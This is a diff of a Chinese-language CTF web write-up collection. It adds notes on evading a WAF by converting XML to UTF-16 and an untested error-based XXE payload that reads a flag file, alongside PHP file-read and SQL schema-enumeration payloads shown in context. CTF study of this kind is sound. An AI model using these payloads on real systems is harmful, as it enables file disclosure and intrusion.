@@ -2453,12 +2453,44 @@ payload:`?exp=print_r(highlight_file(next(array_reverse(scandir(current(localeco
     ```
 2. 用下面命令更改编码方式
 
+    XXE 绕过WAF保护
+
+    >一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。
+    
+    >在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集
+
     ```bash
     cat xml.xml | iconv -f UTF-8 -t UTF-16BE > 1.xml
     ```
 3. 上传1.xml
 
     经过测是，在name处的flag被截断了，可能有长度限制，intro标签处可以正常输出
+
+    还有wp说可以报错带出数据
+
+    payload如下，未经测试：
+
+    ```xml
+    <?xml version='1.0' encoding="utf-16"?>
+    <!DOCTYPE message[ 
+    <!ELEMENT message ANY >
+    <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///flag">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///yemoli/&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;error;
+    '>
+    %NUMBER;
+    ]> 
+    <users>
+    <user>
+        <username>bob</username>
+        <password>passwd2</password>
+        <name>Bob</name>
+        <email>bob@fakesite.com</email>
+        <group>&xxe;</group>
+    </user>
+    </users>
+    ```
 
 ## BJDCTF2020 Mark loves cat(.git目录泄露+代码审计)
 
@@ -4562,7 +4594,7 @@ eval($hhh);
 这道题不是二次注入，是个普通的注入题目，从这道题学到一个新的知识点
 
 **从information表查数据库名**
-----------------------------
+
 ```sql
 select group_concat(schema_name) from information_schema.schemata;
 ```
